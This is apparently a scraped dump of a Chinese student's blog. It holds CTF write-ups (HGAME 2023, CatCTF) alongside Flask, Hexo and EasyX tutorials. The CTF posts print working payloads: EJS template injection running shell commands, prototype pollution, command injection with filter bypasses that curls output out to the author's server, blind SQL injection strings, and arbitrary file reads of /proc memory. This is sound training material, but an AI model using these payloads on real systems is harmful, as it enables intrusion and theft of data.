几个星期前，我们收到一个神秘的消息。但是这个消息被重重加密，我们不知道它的真正含义是什么。唯一知道的信息是关于密钥的：“只有倒着翻过十八层的篱笆才能抵达北欧神话的终点”。 morse.wav是摩斯密码，我是用Audacity打开看手动转为电码： —–/..—/..—/…–/./..–.-/.–./.-./../../-…/.-../-.–/..–.-/..–.-/…./—/-./.–/.-/..–.-/.—/–/–./…./..–.-/..-./–./-.-/-.-./–.-/.-/—/–.-/-/–/..-./.-./ 解密是在摩斯电码转换 解密得到：0223E_PRIIBLY__HONWA_JMGH_FGKCQAOQTMFR 题目说了最后套上hgame{}且均为小写，转换一下为小写 0223e_priibly__honwa_jmgh_fgkcqaoqtmfr 接下来就是根据提示了：只有倒着翻过十八层的篱笆才能抵达北欧神话的终点 分别对应为：逆序、18为一组的栅栏、以Vidar为密钥的维吉尼亚 前两个好想，最后的北欧神话是Vidar-Team名字的由来，可以去官网了解。 最后就用CyberChef来演示： flag:hgame{welcome_to_hgame2023_and_enjoy_hacking} Pwntest_nc测试远程连接用233 IDA打开vuln，很直接，我喜欢。 用ubuntu远程连接cat flag就行了。 week1就有点折磨到了，week2QAQQAQQAQQAQQAQQAQQAQQAQ"},{"title":"HGAME 2022 Week4 writeup by ripple","date":"2023-02-02T16:00:00.000Z","url":"/2023/02/03/HGAME-Week4/","categories":[["CTF","/categories/CTF/"],["match","/categories/CTF/match/"]],"content":"HGAME 2022 Week4 writeup by rippleWebTell Me我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机我一定要换Linux主力机 其实这题不算难，只需要有个服务器就行，搭网站还是痛并快乐着的。（😎–&gt;👌🕶️–&gt;😭） 开启题目环境，F12后发现hint 看来时可能有源码泄露。 访问/www.zip得到源码。 看文件可以猜到flag.php与send.php和index.php在同一目录下。 审计send.php中的内容，可以发现有XXE漏洞。 而且是一个XXE盲注，在后面的过程中也可以发现。 参考了文章：Blind XXE 详解 + Google CTF 一道题目分析 这个大佬讲的很好。 先去整了一个服务器，安装了apache等一些包，然后配置了一个80/80端口。传一个test.dtd文件到/var/www/html目录下 内容为： 其中my_ip是服务器公网ip。 （这里轻描淡写的几句整了好久哇QAQ，我一定要换Linux主力机） 自己访问my_ip/test.dtd发现可以下载文件说明可用了。 burpsuite抓包，添加XML语句： 其中my_ip是服务器公网ip。 发送后等待一会儿，返回了flag.php的base64的编码。 解码得到flag.php，里面就是flag: flag:hgame{Be_Aware_0f_XXeBl1nd1njecti0n} Shared Diary考察js原型链污染与ejs模板注入。 这题折磨了好久，主要原因是对漏洞的原理不清以及开发基础太差。看到什么就自以为是的乱做题目，不理智分析，白白浪费好多时间，值得反思！ 附件里有源码，可以知道flag在服务器上，要RCE到flag。 打开题目环境，顺便输入，显示Login as admin or don’t touch my shared diary! 再看源码： 发现这里使用了可以导致原型链污染的函数merge。 关于原型链的污染参考了：原型链漏洞 这里用VScode调试一下更清楚，参考了网站：Node.js原型链污染的利用学习调试。 具体就不多说了，这里要注意要绕过一下__proto__，用constructor加上prototype一起绕过。 附上询问学长时得到的图片帮助理解： 结合源码中的判断是否为admin的语句： 最终构造的payload为：**{“constructor”: {“prototype”: {“data”:{“username”:1},”role”: “admin”}}}** 记得把Content-Type里面的application/x-www-form-urlencoded改为application/json 附上成功绕过的报文： 成功绕过登录： 一开始真的时太想当然了，还以为是XSS，这里既没有bot，又不是得到什么cookie的。 后来学长提示是存在SSTI的点，但又蠢了，看网上什么ejs+原型链污染组合拳获取shell，又在那搞原型链污染了。。。 最后其实就是用这个SSTI的点来ejs模板注入实现RCE。这里太想当然了。 ejs模板就是类似&lt;%- %&gt; Node.js中的chile_process.exec调用的是/bash.sh，它是一个bash解释器，可以执行系统命令。 payload: &lt;%- global.process.mainModule.constructor._load(‘child_process’).execSync(‘cat/flag’)%&gt; 输入后即可得到flag。 flag:hgame{N0tice_prototype_pollution&amp;&amp;EJS_server_template_injection} MISCezWin - variableswindows取证，利用volatility3。 学习参考了Volatility3内存取证工具使用详解。 下载附件是windows的镜像文件。三个题是同一个文件，只做了两个出来QAQ。 这题是找环境变量，比较简单。 方法一：直接用16进制编译器打开文件，搜索hgame。 得到flag。 方法二：用volatility3分析找到所有环境变量。 下载volatility3，把要分析的文件放在同一文件夹下。cmd进入文件夹，执行命令： 得到flag。 flag:hgame{2109fbfd-a951-4cc3-b56e-f0832eb303e1} ezWin - auth执行代码 列出进程命令行参数 发现提示：flag2 is nthash of current user 再执行 当前的user是Noname，可以从先前的HOMEPATH是\\Users\\Noname看出，nthash是84b0d9c9f830238933e7131d60ac6436 这里就有点瞎猫碰上死耗子了，看到有个nthash，抱着试一试的心态裹了一个hgame{}，没想到真是flag。 flag:hgame{84b0d9c9f830238933e7131d60ac6436} 再第三个7zip就不会了，但找到了一个线索??(可能) 有个dumpme!!!!!!!.exe 还有就是发现了flag.7z这个文件 学艺不精，不会了。QAQ 第一次接触取证，感觉还是很有意思的！ WP结束了。HGAME也结束了，下面就是一些感想： 长一个月的HGAME结束了。感想很多。有做不出题目的坐牢与折磨，也有出flag时的激动与狂喜。 几乎每个题目都是我不会的知识点，现学现买。后面也都是各个学长学姐批评指点鼓励帮助下慢慢前进，真的非常感动与感谢！ 之前做re有个题，学长和我说了编译优化（编译后为了加快数据的初始化速度就4字节一初始化）这个词，后来刷视频刷到个美女视频，PS痕迹比较多、妆比较浓，下意识第一的反应就是：这编译优化开的有点高啊。然后反应过来一个人傻笑了好久。 crypto有个RSA大冒险2最后一关是泄露p高位，但泄露的很少，网上抄的脚本不够出，那天挂了一夜脚本第二天起来一看还没跑出来，很是绝望，原理不懂不知道怎么改，难受了很久。 刚开始打比赛那几天都没睡安稳，晚上总觉得脑子在转想题目，有次做梦梦到一个题目关键，一起来一回忆，是什么只要让美羊羊带着沸羊羊开车去狼堡这题就出来了（可能因为当天刷了B站那个“阿里嘎多美羊羊桑”系列视频，整的梦都抽象了）。 Web收获最大，后面每题都是新知识点，在学长帮助下摸着石头过河，同时也意识到了自己许许多多的不足之处。学学学！！！ 总之非常感谢有HGAME这样的一个机会，感谢学长学姐的热情指点！！！ 也发现大佬是真的多且强大啊啊啊啊QAQQAQQAQ"},{"title":"HGAME 2022 Week3 writeup by ripple","date":"2023-01-28T16:00:00.000Z","url":"/2023/01/29/HGAME-Week3/","categories":[["CTF","/categories/CTF/"],["match","/categories/CTF/match/"]],"content":"HGAME 2022 Week3 writeup by rippleWebPing To The Host考察命令注入 打开来是一个ping的网站 先试试127.0.0.1，回显success 一开始尝试直接去ls，发现没有回显以及有一些过滤（返回Waf!） 在学长指导下知道了可以使用curl将回显的内容发送到自己的服务器端。 以下是一些过滤的绕过方法:空格 —&gt; ${IFS} and —&gt; &amp;&amp; cd —&gt; c\\d cat —&gt; ca\\t flag —&gt; f\\lag 主要是采用了\\连接符来绕过，还有就是用`先执行命令。 临时先用burpsuite里的Burp Collaborator client，等有空了整一个服务器。 直接ls不能输出全部的，先采用了base64转码： 127.0.0.1${IFS}&amp;&amp;${IFS}curl${IFS}-v${IFS}${IFS}--data${IFS}\\`ls|base64` 返回：NQphcHAucHkKc3RhdGljCnRlbXBsYXRlcwo= base64解码得到： 这里看了一下文件夹里有没有flag，返回上一层目录找。 127.0.0.1${IFS}&amp;&amp;${IFS}curl${IFS}-v${IFS}${IFS}--data${IFS}\\`c\\d${IFS}..&amp;&amp;ls|base64` 返回：YXBwCmJpbgpib290CmRldgpldGMKZmxhZ19pc19oZXJlX2hhaGEKaG9tZQpsaWIKbGliNjQKbWVk base64解码 发现flag_is_here_haha，cat一下就行了 127.0.0.1${IFS}&amp;&amp;${IFS}curl${IFS}-v${IFS}${IFS}--data${IFS}\\`c\\d${IFS}..&amp;&amp;ca\\t${IFS}fl\\ag_is_here_haha` 得到flag:hgame{p1nG_t0_ComM4nD_ExecUt1on_dAngErRrRrRrR!} Login To Get My Gift考察SQL盲注 由于不会使用脚本，这题我是采用Burpsuite里的Intruder半自动手注 一个一个的找太痛苦啦，不过看着账号密码一点点出来也是很爽的 可以布尔盲注或是时间盲注，我好像都利用了？ 返回sleep的回显会慢且最后时fail，返回1时比较快且最后时success，字段也不同。 具体就是把regexp后面的ASCII值换掉，一个个试（Intruder） 然后找到正确的值之后再手动改为下一个，再一个个试出ASCII。 这里要注意regexp和=的区别，regexp不区分大小写且包含就行，一开始被这个坑了，所以先转为ASCII 闭合为 ‘ 然后展示一下绕过方法： and –&gt; &amp;&amp; substr –&gt; left(right()) 空格 –&gt; /*1*/ 过程比较枯燥，就附一张图吧，其他都是差不多的。 这是查出数据库名第一位ASCII值为76（L） 查出数据库名长度为7testpassword’/*1*/&amp;&amp;if(length(database())/*1*/regexp/*1*/7,sleep(5),1)# 查出数据库名字为L0g1NMe testpassword’/*1*/&amp;&amp;/*1*/if(ascii(right(left(database(),1),1))/*1*/regexp/*1*/76,sleep(5),1)# 查出表长14testpassword’/*1*/&amp;&amp;/*1*/if(length((select/*1*/table_name/*1*/from/*1*/information_schema.tables/*1*/where/*1*/table_schema/*1*/regexp/*1*/‘L0g1NMe’/*1*/limit/*1*/0,1))/*1*/regexp/*1*/‘14’,sleep(5),1)# 查出表名User1nf0mAt1on testpassword’/*1*/&amp;&amp;/*1*/if(ascii(right(left((select/*1*/table_name/*1*/from/*1*/information_schema.tables/*1*/where/*1*/table_schema/*1*/regexp/*1*/‘L0g1NMe’/*1*/limit/*1*/0,1),1),1))/*1*/regexp/*1*/1,sleep(5),1)# 查出字段一长2 testpassword’/*1*/&amp;&amp;/*1*/if(length((select/1/column_name/*1*/from/*1*/information_schema.columns/*1*/where/*1*/table_name/*1*/regexp/*1*/‘User1nf0mAt1on’/*1*/limit/*1*/0,1))/*1*/regexp/*1*/2,sleep(5),1)# 查出字段名一id testpassword’/*1*/&amp;&amp;/*1*/if(ascii(right(left((select/*1*/column_name/*1*/from/*1*/information_schema.columns/*1*/where/*1*/table_name/*1*/regexp/*1*/‘User1nf0mAt1on’/*1*/limit/*1*/0,1),1),1))/*1*/regexp/*1*/1,sleep(5),1)# 查出字段名二UsErN4me testpassword’/*1*/&amp;&amp;/*1*/if(ascii(right(left((select/*1*/column_name/*1*/from/*1*/information_schema.columns/*1*/where/*1*/table_name/*1*/regexp/*1*/‘User1nf0mAt1on’/*1*/limit/*1*/1,1),1),1))/*1*/regexp/*1*/1,sleep(5),1)# 查出字段名三PAssw0rD testpassword’/*1*/&amp;&amp;/*1*/if(ascii(right(left((select/*1*/column_name/*1*/from/*1*/information_schema.columns/*1*/where/*1*/table_name/*1*/regexp/*1*/‘User1nf0mAt1on’/*1*/limit/*1*/2,1),1),1))/*1*/regexp/*1*/1,sleep(5),1)# 查出值hgAmE2023HAppYnEwyEArtestpassword’/*1*/&amp;&amp;/*1*/if(ascii(right(left((select/*1*/UsErN4me/*1*/from/*1*/User1nf0mAt1on/*1*/limit/1/0,1),1),1))/*1*/regexp/*1*/1,sleep(5),1)# 查出值WeLc0meT0hgAmE2023hAPPySqltestpassword’/*1*/&amp;&amp;/*1*/if(ascii(right(left((select/*1*/PAssw0rD/*1*/from/*1*/User1nf0mAt1on/*1*/limit/*1*/0,1),1),1))/*1*/regexp/*1*/1,sleep(5),1)# hgAmE2023HAppYnEwyEAr就是admin用户名WeLc0meT0hgAmE2023hAPPySql是admin密码，用这个登录就行啦！ 访问/home路由即为flag。 flag:hgame{It_1s_1n7EresT1nG_T0_ExPL0Re_Var10us_Ways_To_Sql1njEct1on} Gopher Shop考察条件竞争与整型溢出 一开始只想到条件竞争结果days不够用，过快访问一下就没了。 后来询问学长才知道可以通过多买多卖导致整型溢出。 思路就是先买一个Apple，然后通过条件竞争多卖出几个Apple，这时候我们Apple个数就成了负数，结果就是整型溢出让我们有了超级多的Apple，再正常卖出即可得到很多钱去买flag了。 先随便注册一个账号，买一个Apple，使用Burpsuite拦截在卖出时抓包，Forward找到卖出东西的请求包send to Intruder。 clear后选择Null payloads，我这里直接发无穷次了，要手速快点取消掉，不然days就不够了。 取消拦截，就惊奇的发现有了好多Apple（溢出啦）。 我这应该是多卖了30个，钱变成310了。 然后卖苹果买Flag后点Check flag就行了 flag:hgame{GopherShop_M@gic_1nt_0verflow} 真的很神奇！ MISCTunnel由于一开始题目有点小问题偷鸡50分。 Revange版本就一脸懵了。 附件用16进制编译器打开搜索hgame即可找到flag。 flag:hgame{ikev1_may_not_safe_aw987rtgh} WEEK3上强度了，之前还想试试re和crypto的题目的，基本都不会QAQ。 加油加油！收获满满。 (WEEK4太痛苦拉啦啦啦啦啦啦啦QAQAQAQAQAQAQAQAQ"},{"title":"flask中debug、host、port的配置方法(pycharm社区版)","date":"2023-01-04T16:00:00.000Z","url":"/2023/01/05/flask_configure/","categories":[["flask","/categories/flask/"]],"content":"pycharm专业版是有专门用于flask开发的，可以在右上角直接调，一下主要是讲讲这三个的作用和pycharm社区版的配置方法。 一、dubug1.作用（1）在debug模式下，修改代码保存后会检测到代码的更改，刷新后自动加载，无需每次关闭重开，更加便捷。 （2）debug模式下，如果代码有bug，在浏览器上可以看到出错信息。 在Flask中文文档中有一个提醒： Attention虽然交互调试器不能在分布环境下工作（这使得它基本不可能用于生产环境），但是 它允许执行任意代码，这样会成为一个重大安全隐患。因此， 绝对不能在生产环境中使用调试器。 2.配置方法app.py中加入代码 点击右上角的运行，就可以直接跑了，再点右上角关闭。 pycharm中把app.run()中改为app.run(debug=1)就开启调试模式了。 二、host1.作用默认的host是127.0.0.1，可通过添加host让其他电脑访问到我们的flask项目。 例如添加host:0.0.0.0，在局域网下就其他设备就可以通过访问电脑IP访问到flask项目。 2.配置方法app.run()括号中加host=”X.X.X.X”就行了。例如： 三、port1.作用在默认的5000端口被其他应用占用时，可通过修改port来运行当前项目，例如需要同时运行多个flask项目时。 2.修改方法app.run()括号中加port=X就行了。例如： 四、综合演示最后附上一个简单的demo: 原app.py: 右上角运行后pycharm的输出： 修改后app.py: 右上角运行后pycharm的输出： 在手机（我的手机和电脑连的是同一个网络）上输入：192.168.0.104:8000 也可以访问到这个flask项目啦。 附上手机的截图： "},{"title":"CatCTF","date":"2023-01-03T16:00:00.000Z","url":"/2023/01/04/CatCTF/","categories":[["CTF","/categories/CTF/"],["match","/categories/CTF/match/"]],"content":"一个为猫猫打猫粮的公益CTF，记录一下收获。 现题目已在攻防世界上线： CatCTF原题 官网WP 一、Misc1.CatchCat第一次做GPS题，上网查了资料写脚本做出来了，很有成就感。 附件是GPS数据文件CatchCat.txt，里面有很多GPS数据： 格式都是： $GPGGA,090000.00,3416.48590278,N,10856.86623887,E,1,05,2.87,160.00,M,-21.3213,M,,*7E 网上的解释：GPGGA格式详解 但这题只用经纬就行。 上网知道了一个好用的py库叫pynmea2，可以提取其中的经纬度信息，然后查到了可以用  来回放点的轨迹。 写了一个Python脚本如下： 将输出结果粘贴到网站右侧放经纬度的地方，得到路线图： 虽然有点不清楚，但还是看的出来的，flag是CatCTF{GPS_M1ao} 2.Miao下载得到一张图片，binwalk分析不出来，用16进制编译器查看发现有一个wav文件，手动分离。 是猫猫的Miao叫声的一个。 用Audacity打开，查看频谱图得到key:CatCTF 上网查了一下，知道了一款叫DeepSound的隐写工具。 用DeepSound打开，用CatCTF作为密码，得到flag.txt。 flag,txt打开发现是猫叫的密码，上网查了一下，选了一个网站解密 。 得到flag CatCTF{d0_y0u_Hate_c4t_ba3k1ng_?_M1ao~} 小总结：有找到密码的音频可以考虑DeepSound和SilentEye，这两个工具是可能要输入密码的 3.catcat下载后得到一个猫猫.jpg和一个我养了一只叫兔子的91岁的猫猫.txt，猜测jpg有密钥，txt是flag的加密。 没发现名字的提示，且猫猫.jpg也没找到密钥，以为是用stegsolve。 这里要提一嘴，jpg不可能是LSB。要去先了解原理，不要只会工具不会原理。 后来才知道是rabbit加密（看txt文件名字的提示），至于密码，是在猫猫.jpg的数据里，用16进制编译器搜索password就行了。 用网站解密txt文件里的内容: 得到的是base91编码的数据（txt文件名里也有提示） 再次用网站解密： 得到的是Ook的加密，最后用网站解密，得到flag: CATCTF{Th1s_V3ry_cute_catcat!!!} 二、Web1.catcat任意文件读取漏洞。 当时只做到找到源码就不会了，主要原因是不会写脚本。 小总结：要提升锻炼写脚本的能力 重新再战这题！ 首先是访问网站随便点一下发现可能存在任意文件读取的漏洞。 试着用 ?file=../../etc/passwd读取系统文件成功，说明确实存在任意文件读取的漏洞 那么我们就可以尝试读取源码了。 官方WP是用了?file=../../proc/self/cmdline先找到了文件名 用?file=../app.py读取源码 我当时是摸的?file../../app/app.py读取源码 上图读出来的源码很乱，但由前面b开头可知这是python中的bytes类型 可以直接使用bytes的decode()方法获取格式化的源码，如下 可以直接使用bytes的decode()方法获取格式化的源码，如下 得源码app.py: 下面官网WP解释的很清楚，借一下（ 首先关注含有flag的部分，以下代码可知程序一启动就读取并删除flag文件 关注到admin路由可以获取flag，但是需要完成session伪造 需要伪造内容为&#123;&quot;admin&quot; : 1&#125;的session，则需要获取secret key secret key部分如下，是生成一个uuid然后去除-再拼接*abcdefgh组成的 文件读取部分可以看到任意文件读取功能是info路由提供的， 注意到可控参数有三个，分别是file，start和end 还注意到其中有个cat函数 分析源码可知cat函数由cat.py提供 ） 同理去访问?file=../cat.py再进行decode()得到cat.py源码。 cat.py: 可以得到cat函数的定义： 作用是读取文件并以bytes返回，观察可知可以设定读取位置（start、end） 结合app.py中： 我们可以知道可以传start和end参数来截取返回的部分内容，比如： 这又有什么用呢？不急，马上就有大用了。 这题的关键点就是伪造session，从而访问admin路由获取flag 但伪造session需要获取secret key 这里可以利用python存储对象的位置在堆上这个特性， app是实例化的Flask对象，而secret key在app.config[&#39;SECRET_KEY&#39;]， 所以可以通过读取/proc/self/mem来读取secret key 其实flag也在内存里，也可以正则匹配直接读取到flag。 但是/proc/self/mem内容较多而且存在不可不可读写部分，无法直接访问到 所以先读取/proc/self/maps获取堆栈分布，用脚本找到可读写部分，再去利用start与end参数访问出来，正则匹配secret_key。 从app.py中可以得到secret_key的格式： 参照了官方脚本和B站上大佬的脚本，我写了一个自己的脚本 main.py: 可以得到flag和secretkey 其实已经得到flag:catctf{Catch_the_c4t_HaHa} 但是还是可以尝试session伪造一下： 由app.py，访问/admin时session里的admin为1时返回flag。 官网是给出了一个github项目： session伪造可以利用如下项目 用这个伪造就行了 最后官方的脚本是： 这里session伪造其实还不是很清楚，如何知道什么加密呢，还是只能用项目，用jwt库能否实现伪造。 但flag总归是出了：flag:catctf{Catch_the_c4t_HaHa}"},{"title":"向博客中上传图片","date":"2022-12-14T16:00:00.000Z","url":"/2022/12/15/upload_img_on_blog/","categories":[["blog","/categories/blog/"]],"content":"在博客中添加图片能更好的让人理解内容，几天写了几篇包含图片的博客，但上传后无法显示。查了一些资料，找到了一个比较好的解决方式。 一、MD语言图片语法可参照Markdown 图片语法 即：![图片alt](图片链接 “图片title”) 二、hexo框架下上传图片到博客首先要打开博客配置文件_config.yml 将其中的 post_asset_folder: false 改为： post_asset_folder: true 这样之后才可以上传 在hexo中相对路径是从博客文件夹开始算起 所以我们可以在source文件夹下新建一个文件夹img，通过将图片的路径设置为/source/img/img.png来上传。 这时候使用typora编辑时图片无法正常显示，因为这时候是按打开文件位置的地方开始算的，但是上传博客后能正常显示。"},{"title":"在博客中创建分类","date":"2022-12-08T16:00:00.000Z","url":"/2022/12/09/create_categories/","categories":[["blog","/categories/blog/"]],"content":"一、创建分类页添加type属性打开命令行（推荐git bash），进入博客文件夹。执行命令 若出现 则成功创建。 在你的博客文件夹source中会有一个叫categories的文件夹，其中有一个index.md文件，打开文件，添加属性type: “categories”。 添加后为： 记得 ctrl + S 保存。 二、为你的文章添加分类这里以我的另一篇文章为例： 原来是 在原来的title下添加一行categories，想一个分类类别的名字填入，例如一个叫blog的分类。 再用 进行部署 接着就能看到你的分类啦！ 注意：1.只有添加了categories: xxx的文章才会被收录到分类中。​ 2.一篇文章只能属于一个分类，如果在“- blog”下方再添加一个“-build_blog”，会在blog下方在创建一个小类，文章会被归属到 “- blog”下的“-build_blog”分类，类比文件夹里的一个文件夹。 "},{"title":"初识flask","date":"2022-12-08T16:00:00.000Z","url":"/2022/12/09/flask_HelloFlask/","categories":[["flask","/categories/flask/"]],"content":"在学长的建议下开始学习使用Flask框架进行Web应用开发 一、Flask简介Flask is a web application framework written in Python. It was developed by Armin Ronacher, who led a team of international Python enthusiasts called Poocco. Flask is based on the Werkzeg WSGI toolkit and the Jinja2 template engine.Both are Pocco projects. Flask是一个用Python编写的Web应用程序框架。它是由Armin Ronacher开发的，他领导了一个名为Poocco的国际Python爱好者团队。Flask基于Werkzeg WSGI工具包和Jinja2模板引擎。两者都是Pocco项目。 简而言之：Flask是一个轻量化的Web框架。 具体学习主要参照了Flask官方文档里的Quickstart。 及一些书目。 二、Flask安装1.python环境与pycharm由于Flask是由python编写的，所以显然需要python的环境与pycharm帮助进行开发。 注意：使用的pycharm最好不要是测试版本（即版本号中带有字母的） （但估计除了我这个憨憨也没人干这事233 当时用pycharm是3.10.0a0的版本，结果导致运行不了flask，也无法用pycharm搭建虚拟环境。 找学长忙活了好久，下了个pycharm3.11的版本就解决了。 感谢ek1ng学长帮助！！！ 2.下载flask包在pycharm中下载flask包就行了， 以及可以下载一个virtualenv的包来配置虚拟环境。 虚拟环境的作用：虚拟环境就是把一部分内容独立出来隔离，在这个虚拟环境，我们可以只安装我们需要的依赖包，各个环境之间互相隔离，互不影响，避免各个依赖包冲突。 三、最简单的应用Hello World! 其中 我们导入了Flask类，该类的实例将会成为我们的 WSGI 应用。 创建一个该类的实例。第一个参数是应用模块或者包的名称。如果你使用 一个单一模块（就像本例），那么应当使用 __name__ ，因为名称会根据这个模块是按应用方式使用还是作为一个模块导入而发生变化（可能是 ‘__main__’ ， 也可能是实际导入的名称）。这个参数是必需的，这样 Flask 才能知道在哪里可以 找到模板和静态文件等东西。 使用 route() 装饰器来告诉 Flask 触发函数的 URL 。 处理URL和函数之间的关系的程序称为路由。 函数名称被用于生成相关联的 URL 。函数最后返回需要在用户浏览器中显示的信息。 windows下可以在pycharm的终端中使用 执行 若返回 则成功启动啦！ 你可以在  看到你的页面如图 使用ctrl + C停止服务器 为此也是折腾了几天，但终于是配置上去了，不过只是flask的开始…… （明天考四级了今天一直在写博客完全没复习啊寄"},{"title":"大一C语言期末作业制作记录-利用EasyX开发小游戏","date":"2022-12-01T16:00:00.000Z","url":"/2022/12/02/C_final_exam/","categories":[["undefined",""]],"content":"期末到了，在C语言期末众多作业选择中选择了比较有趣的利用EasyX开发小游戏第一次和别人一起开发程序，故作记录。 一、主题确定在决定用EasyX进行小游戏开发后我们开始考虑制作的方向鉴于使用EasyX图形库，我们打算开发一个像素游戏商量过后决定做一款类似（抄袭）地城迷踪（Dungeon and Puzzles）的游戏 二、前置准备和学习1.EasyX的安装EasyX 是针对 C/C++ 的图形库，可以帮助使用C/C++语言的程序员快速上手图形和游戏编程，可以用来做些简单的演示2d类游戏，没有cocos2d-x那样重量级，学习起来也比较简单。 在EasyX官网进行下载并安装即可 2.EasyX的学习EasyX图形库的学习，在B站上找了一个EasyX教学视频进行观看和学习。讲的还是不错的。 安装也可参照此视频。 3.图片的绘制图片的绘制是在写代码中顺便一起完成的，这里使用像素画软件aseprite进行绘制，对地城迷踪（Dungeon and Puzzles）与网络上的一些图片进行临摹。画出了一系列的像素图片。 三、代码逻辑的构建游戏主要代码在test.cpp中 函数、全局变量声明在game.h中 自定义函数的逻辑实现在game.cpp中 2.基本思路先不用EasyX库，利用已有的C语言知识对最基本的逻辑利用二维数组模拟实现游戏过程，再加入二维图形数组利用EasyX库进行可视化的开发。 3.遇到的问题与解决的办法没有对代码经行过多的优化，算法上有许多不足甚至可能有错误QAQ （1）关键函数的逻辑实现首先是关键函数move的逻辑编写，遇到拿了钥匙打不开箱子和未到箱子附近就直接打开了箱子的问题。前者定义了一个全局变量flag解决，后者用移动前先用变量i、j 记录开始移动时位置判断解决。 （2） 可视化移动时出现的bug一开始是打算用键盘进行的移动操作，但是每次会一下接受到很多的键盘请求，出现一堆bug，最后我们选用了利用图片鼠标点击的形式进行解决。"},{"title":"Hexo 框架下利用 github 搭建博客 (win 11)","date":"2022-10-31T16:00:00.000Z","url":"/2022/11/01/Build_your_blog/","categories":[["blog","/categories/blog/"]],"content":"想要一个博客吗？那我们开始吧！ 参考文章：hexo史上最全搭建教程 一、前置条件1.一个github账号注册一个github账号非常简单，这里可参照 2.安装gitGit是目前世界上最先进的分布式版本控制系统，可以有效、高速的处理从很小到非常大的项目版本管理。也就是用来管理你的hexo博客文章，上传到GitHub的工具。 windows需要到官网  下载 安装好后，可以在控制行命令（win+R输入cmd打开）中用一下代码查看版本，以检测是否安装成功。 若出现类似 则成功安装有gitbash的话就可以用gitbash代替命令行了 3.安装nodejs和npm工具Hexo是基于nodeJS编写的，所以自然要安装一下nodeJs和里面的npm工具。 windows下直接去官网  上选择LTS版本下载就行了 安装完后打开命令行，依次输入 检查是否安装成功，若依次出现 版本号则成功 4. 安装hexo前面git和nodejs安装好后，就可以安装hexo了，你可以先创建一个文件夹blog，然后cd到这个文件夹下（或者在这个文件夹下直接右键git bash打开）。 输入命令 进行安装 用 查看版本确认是否成功安装 出现类似 则成功 至此，所有工具安装完毕，开始你的博客搭建之旅吧 二、创建博客文件夹1.初始化博客文件夹在上一步建立的文件夹blog中右键打开gitbash(cd到文件夹下也行)，输入 其中myblog是博客文件夹的名字，你可以修改为任意你喜欢的名字，下面所有的myblog也同样修改 然后 建完后myblog文件夹下应有：node_modules: 依赖包public：存放生成的页面scaffolds：生成文章的一些模板source：用来存放你的文章themes：主题_config.yml: 博客的配置文件 此时打开hexo服务，浏览器输入localhost:4000应该就能看见你的博客了 使用ctrl+c关闭服务 三、将hexo部署到github1.建立一个github库登录你的github账号，点击右上角头像后选择your repositories,再点右上角的New新建一个库 这个库请注意，它的名字（Repository name一栏中）必须是：your_github_name.github.io即:你的github用户名后加.github.io例如：我的用户名是rippleQAQ，那这个仓库名就是rippleQAQ.github.io 然后点下方的create repository就行了 2.生成SSH添加到GitHub进入gitbash你可以使用 查看你的用户名和注册邮箱 然后在gitbash中运行 注意：这里的yourname与youremail请替换成上面你自已的用户名与邮箱 然后创建SSH 接着一直按回车就行了，同理youremail是你的邮箱到最后会有一张奇怪的图片The key’s randomart image is: 这个时候它会告诉你已经生成了.ssh的文件夹。在你的电脑中找到这个文件夹(.ssh)。 ssh是一个秘钥，文件夹里的id_rsa私钥，不能给别人看，id_rsa.pub是公钥，可以给别人看。把这个公钥放在GitHub上，这样链接GitHub时，它会根据公钥匹配私钥，相互匹配时，才能够顺利的通过git上传文件到GitHub上。 在github中点击右上角头像，进入settings，在左侧找到SSH and GPG keys一栏进入，点击New SSH key按钮title可以随便取，Key一栏中把id_rsa.pub的内容复制进去win 11好像默认会用Microsoft Publisher打开，但Publisher打不开。我们右键用记事本打开就行了。将id_rsa.pub中所有内容复制粘贴到Key一栏中后点Add SSH Key就行了 在gitbash中，查看是否成功 若出现就行了 当然这里rippleQAQ换为你的用户名 3.进行hexo部署离你的博客就差一步了，加油！ 打开站点配置文件_config.yml，翻到最后，修改为 YourgithubName请改为你的用户名，如rippleQAQ/rippleQAQ.github.io.git 如果不行试试把.git删掉?两种好像都行 需要先安装deploy-git，才能用命令部署到GitHub 完成后依次输入（注意要在myblog这个文件夹下） hexo clean清除了你之前生成的东西hexo generate （hexo g）生成静态文章hexo deploy （hexo d） 部署文章 注意deploy时可能要你输入username和password 如果最后出现INFO Deploy done: git恭喜你！开始你的博客之旅吧！你可以在  看见你的博客了！！ "}]